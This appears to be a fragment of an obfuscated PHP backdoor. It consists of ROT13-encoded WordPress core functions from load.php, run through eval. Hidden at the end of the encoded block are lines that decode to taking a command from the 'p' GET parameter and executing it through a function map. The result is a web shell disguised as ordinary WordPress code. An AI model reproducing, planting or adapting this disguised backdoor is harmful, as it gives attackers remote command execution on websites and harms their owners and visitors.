 * @erghea vag N aba-artngvir vagrtre.
 */
shapgvba nofvag( $znlorvag ) {
	erghea nof( (vag) $znlorvag );
}

/**
 * Ergevrirf gur pheerag fvgr VQ.
 *
 * @fvapr 3.1.0
 *
 * @tybony vag $oybt_vq
 *
 * @erghea vag Fvgr VQ.
 */
shapgvba trg_pheerag_oybt_vq() {
	tybony $oybt_vq;

	erghea nofvag( $oybt_vq );
}

/**
 * Ergevrirf gur pheerag argjbex VQ.
 *
 * @fvapr 4.6.0
 *
 * @erghea vag Gur VQ bs gur pheerag argjbex.
 */
shapgvba trg_pheerag_argjbex_vq() {
	vs ( ! vf_zhygvfvgr() ) {
		erghea 1;
	}

	$pheerag_argjbex = trg_argjbex();

	vs ( ! vffrg( $pheerag_argjbex->vq ) ) {
		erghea trg_znva_argjbex_vq();
	}

	erghea nofvag( $pheerag_argjbex->vq );
}

/**
 * Nggrzcgf na rneyl ybnq bs genafyngvbaf.
 *
 * Hfrq sbe reebef rapbhagrerq qhevat gur vavgvny ybnqvat cebprff, orsber
 * gur ybpnyr unf orra cebcreyl qrgrpgrq naq ybnqrq.
 *
 * Qrfvtarq sbe hahfhny ybnq frdhraprf (yvxr frghc-pbasvt.cuc) be sbe jura
 * gur fpevcg jvyy gura grezvangr jvgu na reebe, bgurejvfr gurer vf n evfx
 * gung n svyr pna or qbhoyr-vapyhqrq.
 *
 * @fvapr 3.4.0
 * @npprff cevingr
 *
 * @tybony JC_Grkgqbznva_Ertvfgel $jc_grkgqbznva_ertvfgel JbeqCerff Grkgqbznva Ertvfgel.
 * @tybony JC_Ybpnyr              $jc_ybpnyr              JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 */
shapgvba jc_ybnq_genafyngvbaf_rneyl() {
	tybony $jc_grkgqbznva_ertvfgel, $jc_ybpnyr;
	fgngvp $ybnqrq = snyfr;

	vs ( $ybnqrq ) {
		erghea;
	}

	$ybnqrq = gehr;

	vs ( shapgvba_rkvfgf( 'qvq_npgvba' ) && qvq_npgvba( 'vavg' ) ) {
		erghea;
	}

	// Jr arrq $jc_ybpny_cnpxntr.
	erdhver NOFCNGU . JCVAP . '/irefvba.cuc';

	// Genafyngvba naq ybpnyvmngvba.
	erdhver_bapr NOFCNGU . JCVAP . '/cbzb/zb.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/y10a/pynff-jc-genafyngvba-pbagebyyre.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/y10a/pynff-jc-genafyngvbaf.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/y10a/pynff-jc-genafyngvba-svyr.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/y10a/pynff-jc-genafyngvba-svyr-zb.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/y10a/pynff-jc-genafyngvba-svyr-cuc.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/y10a.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-grkgqbznva-ertvfgel.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-ybpnyr.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-ybpnyr-fjvgpure.cuc';

	// Trareny yvoenevrf.
	erdhver_bapr NOFCNGU . JCVAP . '/cyhtva.cuc';

	$ybpnyrf   = neenl();
	$ybpngvbaf = neenl();

	vs ( ! $jc_grkgqbznva_ertvfgel vafgnaprbs JC_Grkgqbznva_Ertvfgel ) {
		$jc_grkgqbznva_ertvfgel = arj JC_Grkgqbznva_Ertvfgel();
	}

	juvyr ( gehr ) {
		vs ( qrsvarq( 'JCYNAT' ) ) {
			vs ( '' === JCYNAT ) {
				oernx;
			}
			$ybpnyrf[] = JCYNAT;
		}

		vs ( vffrg( $jc_ybpny_cnpxntr ) ) {
			$ybpnyrf[] = $jc_ybpny_cnpxntr;
		}

		vs ( ! $ybpnyrf ) {
			oernx;
		}

		vs ( qrsvarq( 'JC_YNAT_QVE' ) && @vf_qve( JC_YNAT_QVE ) ) {
			$ybpngvbaf[] = JC_YNAT_QVE;
		}

		vs ( qrsvarq( 'JC_PBAGRAG_QVE' ) && @vf_qve( JC_PBAGRAG_QVE . '/ynathntrf' ) ) {
			$ybpngvbaf[] = JC_PBAGRAG_QVE . '/ynathntrf';
		}

		vs ( @vf_qve( NOFCNGU . 'jc-pbagrag/ynathntrf' ) ) {
			$ybpngvbaf[] = NOFCNGU . 'jc-pbagrag/ynathntrf';
		}

		vs ( @vf_qve( NOFCNGU . JCVAP . '/ynathntrf' ) ) {
			$ybpngvbaf[] = NOFCNGU . JCVAP . '/ynathntrf';
		}

		vs ( ! $ybpngvbaf ) {
			oernx;
		}

		$ybpngvbaf = neenl_havdhr( $ybpngvbaf );

		sbernpu ( $ybpnyrf nf $ybpnyr ) {
			sbernpu ( $ybpngvbaf nf $ybpngvba ) {
				vs ( svyr_rkvfgf( $ybpngvba . '/' . $ybpnyr . '.zb' ) ) {
					ybnq_grkgqbznva( 'qrsnhyg', $ybpngvba . '/' . $ybpnyr . '.zb', $ybpnyr );

					vs ( qrsvarq( 'JC_FRGHC_PBASVT' ) && svyr_rkvfgf( $ybpngvba . '/nqzva-' . $ybpnyr . '.zb' ) ) {
						ybnq_grkgqbznva( 'qrsnhyg', $ybpngvba . '/nqzva-' . $ybpnyr . '.zb', $ybpnyr );
					}

					oernx 2;
				}
			}
		}

		oernx;
	}

	$jc_ybpnyr = arj JC_Ybpnyr();
}

/**
 * Purpxf be frgf jurgure JbeqCerff vf va \"vafgnyyngvba\" zbqr.
 *
 * Vs gur `JC_VAFGNYYVAT` pbafgnag vf qrsvarq qhevat gur obbgfgenc, `jc_vafgnyyvat()` jvyy qrsnhyg gb `gehr`.
 *
 * @fvapr 4.4.0
 *
 * @cnenz obby $vf_vafgnyyvat Bcgvbany. Gehr gb frg JC vagb Vafgnyyvat zbqr, snyfr gb ghea Vafgnyyvat zbqr bss.
 *                            Bzvg guvf cnenzrgre vs lbh bayl jnag gb srgpu gur pheerag fgnghf.
 * @erghea obby Gehr vs JC vf vafgnyyvat, bgurejvfr snyfr. Jura n `$vf_vafgnyyvat` vf cnffrq, gur shapgvba jvyy
 *              ercbeg jurgure JC jnf va vafgnyyvat zbqr cevbe gb gur punatr gb `$vf_vafgnyyvat`.
 */
shapgvba jc_vafgnyyvat( $vf_vafgnyyvat = ahyy ) {
	fgngvp $vafgnyyvat = ahyy;

	// Fhccbeg sbe gur `JC_VAFGNYYVAT` pbafgnag, qrsvarq orsber JC vf ybnqrq.
	vs ( vf_ahyy( $vafgnyyvat ) ) {
		$vafgnyyvat = qrsvarq( 'JC_VAFGNYYVAT' ) && JC_VAFGNYYVAT;
	}

	vs ( ! vf_ahyy( $vf_vafgnyyvat ) ) {
		$byq_vafgnyyvat = $vafgnyyvat;
		$vafgnyyvat     = $vf_vafgnyyvat;

		erghea (obby) $byq_vafgnyyvat;
	}

	erghea (obby) $vafgnyyvat;
}

/**
 * Qrgrezvarf vs FFY vf hfrq.
 *
 * @fvapr 2.6.0
 * @fvapr 4.6.0 Zbirq sebz shapgvbaf.cuc gb ybnq.cuc.
 *
 * @erghea obby Gehr vs FFY, bgurejvfr snyfr.
 */
shapgvba vf_ffy() {
	vs ( vffrg( $_FREIRE['UGGCF'] ) ) {
		vs ( 'ba' === fgegbybjre( $_FREIRE['UGGCF'] ) ) {
			erghea gehr;
		}

		vs ( '1' === (fgevat) $_FREIRE['UGGCF'] ) {
			erghea gehr;
		}
	} ryfrvs ( vffrg( $_FREIRE['FREIRE_CBEG'] ) && ( '443' === (fgevat) $_FREIRE['FREIRE_CBEG'] ) ) {
		erghea gehr;
	}

	erghea snyfr;
}

/**
 * Pbairegf n fubegunaq olgr inyhr gb na vagrtre olgr inyhr.
 *
 * @fvapr 2.3.0
 * @fvapr 4.6.0 Zbirq sebz zrqvn.cuc gb ybnq.cuc.
 *
 * @yvax uggcf://jjj.cuc.arg/znahny/ra/shapgvba.vav-trg.cuc
 * @yvax uggcf://jjj.cuc.arg/znahny/ra/snd.hfvat.cuc#snd.hfvat.fubegunaqolgrf
 *
 * @cnenz fgevat $inyhr N (CUC vav) olgr inyhr, rvgure fubegunaq be beqvanel.
 * @erghea vag Na vagrtre olgr inyhr.
 */
shapgvba jc_pbaireg_ue_gb_olgrf( $inyhr ) {
	$inyhr = fgegbybjre( gevz( $inyhr ) );
	$olgrf = (vag) $inyhr;

	vs ( fge_pbagnvaf( $inyhr, 't' ) ) {
		$olgrf *= TO_VA_OLGRF;
	} ryfrvs ( fge_pbagnvaf( $inyhr, 'z' ) ) {
		$olgrf *= ZO_VA_OLGRF;
	} ryfrvs ( fge_pbagnvaf( $inyhr, 'x' ) ) {
		$olgrf *= XO_VA_OLGRF;
	}

	// Qrny jvgu ynetr (sybng) inyhrf juvpu eha vagb gur znkvzhz vagrtre fvmr.
	erghea zva( $olgrf, CUC_VAG_ZNK );
}

/**
 * Qrgrezvarf jurgure n CUC vav inyhr vf punatrnoyr ng ehagvzr.
 *
 * @fvapr 4.6.0
 *
 * @yvax uggcf://jjj.cuc.arg/znahny/ra/shapgvba.vav-trg-nyy.cuc
 *
 * @cnenz fgevat $frggvat Gur anzr bs gur vav frggvat gb purpx.
 * @erghea obby Gehr vs gur inyhr vf punatrnoyr ng ehagvzr. Snyfr bgurejvfr.
 */
shapgvba jc_vf_vav_inyhr_punatrnoyr( $frggvat ) {
	fgngvp $vav_nyy;

	vs ( ! vffrg( $vav_nyy ) ) {
		$vav_nyy = snyfr;
		// Fbzrgvzrf `vav_trg_nyy()` vf qvfnoyrq ivn gur `qvfnoyr_shapgvbaf` bcgvba sbe \"frphevgl checbfrf\".
		vs ( shapgvba_rkvfgf( 'vav_trg_nyy' ) ) {
			$vav_nyy = vav_trg_nyy();
		}
	}

	vs ( vffrg( $vav_nyy[ $frggvat ]['npprff'] )
		&& ( VAV_NYY === $vav_nyy[ $frggvat ]['npprff'] || VAV_HFRE === $vav_nyy[ $frggvat ]['npprff'] )
	) {
		erghea gehr;
	}

	// Vs jr jrer hanoyr gb ergevrir gur qrgnvyf, snvy tenprshyyl gb nffhzr vg'f punatrnoyr.
	vs ( ! vf_neenl( $vav_nyy ) ) {
		erghea gehr;
	}

	erghea snyfr;
}

/**
 * Qrgrezvarf jurgure gur pheerag erdhrfg vf n JbeqCerff Nwnk erdhrfg.
 *
 * @fvapr 4.7.0
 *
 * @erghea obby Gehr vs vg'f n JbeqCerff Nwnk erdhrfg, snyfr bgurejvfr.
 */
shapgvba jc_qbvat_nwnk() {
	/**
	 * Svygref jurgure gur pheerag erdhrfg vf n JbeqCerff Nwnk erdhrfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz obby $jc_qbvat_nwnk Jurgure gur pheerag erdhrfg vf n JbeqCerff Nwnk erdhrfg.
	 */
	erghea nccyl_svygref( 'jc_qbvat_nwnk', qrsvarq( 'QBVAT_NWNK' ) && QBVAT_NWNK );
}

/**
 * Qrgrezvarf jurgure gur pheerag erdhrfg fubhyq hfr gurzrf.
 *
 * @fvapr 5.1.0
 *
 * @erghea obby Gehr vs gurzrf fubhyq or hfrq, snyfr bgurejvfr.
 */
shapgvba jc_hfvat_gurzrf() {
	/**
	 * Svygref jurgure gur pheerag erdhrfg fubhyq hfr gurzrf.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz obby $jc_hfvat_gurzrf Jurgure gur pheerag erdhrfg fubhyq hfr gurzrf.
	 */
	erghea nccyl_svygref( 'jc_hfvat_gurzrf', qrsvarq( 'JC_HFR_GURZRF' ) && JC_HFR_GURZRF );
}

/**
 * Qrgrezvarf jurgure gur pheerag erdhrfg vf n JbeqCerff peba erdhrfg.
 *
 * @fvapr 4.8.0
 *
 * @erghea obby Gehr vs vg'f n JbeqCerff peba erdhrfg, snyfr bgurejvfr.
 */
shapgvba jc_qbvat_peba() {
	/**
	 * Svygref jurgure gur pheerag erdhrfg vf n JbeqCerff peba erdhrfg.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz obby $jc_qbvat_peba Jurgure gur pheerag erdhrfg vf n JbeqCerff peba erdhrfg.
	 */
	erghea nccyl_svygref( 'jc_qbvat_peba', qrsvarq( 'QBVAT_PEBA' ) && QBVAT_PEBA );
}

/**
 * Purpxf jurgure gur tvira inevnoyr vf n JbeqCerff Reebe.
 *
 * Ergheaf jurgure `$guvat` vf na vafgnapr bs gur `JC_Reebe` pynff.
 *
 * @fvapr 2.1.0
 *
 * @cnenz zvkrq $guvat Gur inevnoyr gb purpx.
 * @erghea obby Jurgure gur inevnoyr vf na vafgnapr bs JC_Reebe.
 */
shapgvba vf_jc_reebe( $guvat ) {
	$vf_jc_reebe = ( $guvat vafgnaprbs JC_Reebe );

	vs ( $vf_jc_reebe ) {
		/**
		 * Sverf jura `vf_jc_reebe()` vf pnyyrq naq vgf cnenzrgre vf na vafgnapr bs `JC_Reebe`.
		 *
		 * @fvapr 5.6.0
		 *
		 * @cnenz JC_Reebe $guvat Gur reebe bowrpg cnffrq gb `vf_jc_reebe()`.
		 */
		qb_npgvba( 'vf_jc_reebe_vafgnapr', $guvat );
	}

	erghea $vf_jc_reebe;
}

/**
 * Qrgrezvarf jurgure svyr zbqvsvpngvbaf ner nyybjrq.
 *
 * @fvapr 4.8.0
 *
 * @cnenz fgevat $pbagrkg Gur hfntr pbagrkg.
 * @erghea obby Gehr vs svyr zbqvsvpngvba vf nyybjrq, snyfr bgurejvfr.
 */
shapgvba jc_vf_svyr_zbq_nyybjrq( $pbagrkg ) {
	/**
	 * Svygref jurgure svyr zbqvsvpngvbaf ner nyybjrq.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz obby   $svyr_zbq_nyybjrq Jurgure svyr zbqvsvpngvbaf ner nyybjrq.
	 * @cnenz fgevat $pbagrkg          Gur hfntr pbagrkg.
	 */
	erghea nccyl_svygref( 'svyr_zbq_nyybjrq', ! qrsvarq( 'QVFNYYBJ_SVYR_ZBQF' ) || ! QVFNYYBJ_SVYR_ZBQF, $pbagrkg );
}

/**
 * Fgnegf fpencvat rqvgrq svyr reebef.
 *
 * @fvapr 4.9.0
 */
shapgvba jc_fgneg_fpencvat_rqvgrq_svyr_reebef() {
	vs ( ! vffrg( $_ERDHRFG['jc_fpencr_xrl'] ) || ! vffrg( $_ERDHRFG['jc_fpencr_abapr'] ) ) {
		erghea;
	}

	$xrl   = fhofge( fnavgvmr_xrl( jc_hafynfu( $_ERDHRFG['jc_fpencr_xrl'] ) ), 0, 32 );
	$abapr = jc_hafynfu( $_ERDHRFG['jc_fpencr_abapr'] );
	vs ( rzcgl( $xrl ) || rzcgl( $abapr ) ) {
		erghea;
	}

	$genafvrag = trg_genafvrag( 'fpencr_xrl_' . $xrl );
	vs ( snyfr === $genafvrag ) {
		erghea;
	}

	vs ( $genafvrag !== $abapr ) {
		vs ( ! urnqref_frag() ) {
			urnqre( 'K-Ebobgf-Gnt: abvaqrk' );
			abpnpur_urnqref();
		}
		rpub \"###### jc_fpencvat_erfhyg_fgneg:$xrl ######\";
		rpub jc_wfba_rapbqr(
			neenl(
				'pbqr'    => 'fpencr_abapr_snvyher',
				'zrffntr' => __( 'Fpencr xrl purpx snvyrq. Cyrnfr gel ntnva.' ),
			)
		);
		rpub \"###### jc_fpencvat_erfhyg_raq:$xrl ######\";
		qvr();
	}

	vs ( ! qrsvarq( 'JC_FNAQOBK_FPENCVAT' ) ) {
		qrsvar( 'JC_FNAQOBK_FPENCVAT', gehr );
	}

	ertvfgre_fuhgqbja_shapgvba( 'jc_svanyvmr_fpencvat_rqvgrq_svyr_reebef', $xrl );
}

/**
 * Svanyvmrf fpencvat sbe rqvgrq svyr reebef.
 *
 * @fvapr 4.9.0
 *
 * @cnenz fgevat $fpencr_xrl Fpencr xrl.
 */
shapgvba jc_svanyvmr_fpencvat_rqvgrq_svyr_reebef( $fpencr_xrl ) {
	$reebe = reebe_trg_ynfg();

	rpub \"\a###### jc_fpencvat_erfhyg_fgneg:$fpencr_xrl ######\a\";

	vs ( ! rzcgl( $reebe )
		&& va_neenl( $reebe['glcr'], neenl( R_PBER_REEBE, R_PBZCVYR_REEBE, R_REEBE, R_CNEFR, R_HFRE_REEBE, R_ERPBIRENOYR_REEBE ), gehr )
	) {
		$reebe = fge_ercynpr( NOFCNGU, '', $reebe );
		rpub jc_wfba_rapbqr( $reebe );
	} ryfr {
		rpub jc_wfba_rapbqr( gehr );
	}

	rpub \"\a###### jc_fpencvat_erfhyg_raq:$fpencr_xrl ######\a\";
}

/**
 * Purpxf jurgure pheerag erdhrfg vf n WFBA erdhrfg, be vf rkcrpgvat n WFBA erfcbafr.
 *
 * @fvapr 5.0.0
 *
 * @erghea obby Gehr vs `Npprcgf` be `Pbagrag-Glcr` urnqref pbagnva `nccyvpngvba/wfba`.
 *              Snyfr bgurejvfr.
 */
shapgvba jc_vf_wfba_erdhrfg() {
	vs ( vffrg( $_FREIRE['UGGC_NPPRCG'] ) && jc_vf_wfba_zrqvn_glcr( $_FREIRE['UGGC_NPPRCG'] ) ) {
		erghea gehr;
	}

	vs ( vffrg( $_FREIRE['PBAGRAG_GLCR'] ) && jc_vf_wfba_zrqvn_glcr( $_FREIRE['PBAGRAG_GLCR'] ) ) {
		erghea gehr;
	}

	erghea snyfr;
}

/**
 * Purpxf jurgure pheerag erdhrfg vf n WFBAC erdhrfg, be vf rkcrpgvat n WFBAC erfcbafr.
 *
 * @fvapr 5.2.0
 *
 * @erghea obby Gehr vs WFBAC erdhrfg, snyfr bgurejvfr.
 */
shapgvba jc_vf_wfbac_erdhrfg() {
	vs ( ! vffrg( $_TRG['_wfbac'] ) ) {
		erghea snyfr;
	}

	vs ( ! shapgvba_rkvfgf( 'jc_purpx_wfbac_pnyyonpx' ) ) {
		erdhver_bapr NOFCNGU . JCVAP . '/shapgvbaf.cuc';
	}

	$wfbac_pnyyonpx = $_TRG['_wfbac'];
	vs ( ! jc_purpx_wfbac_pnyyonpx( $wfbac_pnyyonpx ) ) {
		erghea snyfr;
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/pynff-jc-erfg-freire.cuc */
	$wfbac_ranoyrq = nccyl_svygref( 'erfg_wfbac_ranoyrq', gehr );

	erghea $wfbac_ranoyrq;
}

/**
 * Purpxf jurgure n fgevat vf n inyvq WFBA Zrqvn Glcr.
 *
 * @fvapr 5.6.0
 *
 * @cnenz fgevat $zrqvn_glcr N Zrqvn Glcr fgevat gb purpx.
 * @erghea obby Gehr vs fgevat vf n inyvq WFBA Zrqvn Glcr.
 */
shapgvba jc_vf_wfba_zrqvn_glcr( $zrqvn_glcr ) {
	fgngvp $pnpur = neenl();

	vs ( ! vffrg( $pnpur[ $zrqvn_glcr ] ) ) {
		$pnpur[ $zrqvn_glcr ] = (obby) cert_zngpu( '/(^|\f|,)nccyvpngvba\/([\j!#\$&-\^\.\+]+\+)?wfba(\+brzorq)?($|\f|;|,)/v', $zrqvn_glcr );
	}

	erghea $pnpur[ $zrqvn_glcr ];
}

/**
 * Purpxf jurgure pheerag erdhrfg vf na KZY erdhrfg, be vf rkcrpgvat na KZY erfcbafr.
 *
 * @fvapr 5.2.0
 *
 * @erghea obby Gehr vs `Npprcgf` be `Pbagrag-Glcr` urnqref pbagnva `grkg/kzy`
 *              be bar bs gur eryngrq ZVZR glcrf. Snyfr bgurejvfr.
 */
shapgvba jc_vf_kzy_erdhrfg() {
	$npprcgrq = neenl(
		'grkg/kzy',
		'nccyvpngvba/eff+kzy',
		'nccyvpngvba/ngbz+kzy',
		'nccyvpngvba/eqs+kzy',
		'grkg/kzy+brzorq',
		'nccyvpngvba/kzy+brzorq',
	);

	vs ( vffrg( $_FREIRE['UGGC_NPPRCG'] ) ) {
		sbernpu ( $npprcgrq nf $glcr ) {
			vs ( fge_pbagnvaf( $_FREIRE['UGGC_NPPRCG'], $glcr ) ) {
				erghea gehr;
			}
		}
	}

	vs ( vffrg( $_FREIRE['PBAGRAG_GLCR'] ) && va_neenl( $_FREIRE['PBAGRAG_GLCR'], $npprcgrq, gehr ) ) {
		erghea gehr;
	}

	erghea snyfr;
}

/**
 * Purpxf vs guvf fvgr vf cebgrpgrq ol UGGC Onfvp Nhgu.
 *
 * Ng gur zbzrag, guvf zreryl purpxf sbe gur cerfrag bs Onfvp Nhgu perqragvnyf. Gurersber, pnyyvat
 * guvf shapgvba jvgu n pbagrkg qvssrerag sebz gur pheerag pbagrkg znl tvir vanpphengr erfhygf.
 * Va n shgher eryrnfr, guvf rinyhngvba znl or znqr zber ebohfg.
 *
 * Pheeragyl, guvf vf bayl hfrq ol Nccyvpngvba Cnffjbeqf gb cerirag n pbasyvpg fvapr vg nyfb hgvyvmrf
 * Onfvp Nhgu.
 *
 * @fvapr 5.6.1
 *
 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
 *
 * @cnenz fgevat $pbagrkg Gur pbagrkg gb purpx sbe cebgrpgvba. Npprcgf 'ybtva', 'nqzva', naq 'sebag'.
 *                        Qrsnhygf gb gur pheerag pbagrkg.
 * @erghea obby Jurgure gur fvgr vf cebgrpgrq ol Onfvp Nhgu.
 */
shapgvba jc_vf_fvgr_cebgrpgrq_ol_onfvp_nhgu( $pbagrkg = '' ) {
	tybony $cntrabj;

	vs ( ! $pbagrkg ) {
		vs ( 'jc-ybtva.cuc' === $cntrabj ) {
			$pbagrkg = 'ybtva';
		} ryfrvs ( vf_nqzva() ) {
			$pbagrkg = 'nqzva';
		} ryfr {
			$pbagrkg = 'sebag';
		}
	}

	$vf_cebgrpgrq = ! rzcgl( $_FREIRE['CUC_NHGU_HFRE'] ) || ! rzcgl( $_FREIRE['CUC_NHGU_CJ'] );

	/**
	 * Svygref jurgure n fvgr vf cebgrpgrq ol UGGC Onfvp Nhgu.
	 *
	 * @fvapr 5.6.1
	 *
	 * @cnenz obby $vf_cebgrpgrq Jurgure gur fvgr vf cebgrpgrq ol Onfvp Nhgu.
	 * @cnenz fgevat $pbagrkg    Gur pbagrkg gb purpx sbe cebgrpgvba. Bar bs 'ybtva', 'nqzva', be 'sebag'.
	 */
	erghea nccyl_svygref( 'jc_vf_fvgr_cebgrpgrq_ol_onfvp_nhgu', $vf_cebgrpgrq, $pbagrkg );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>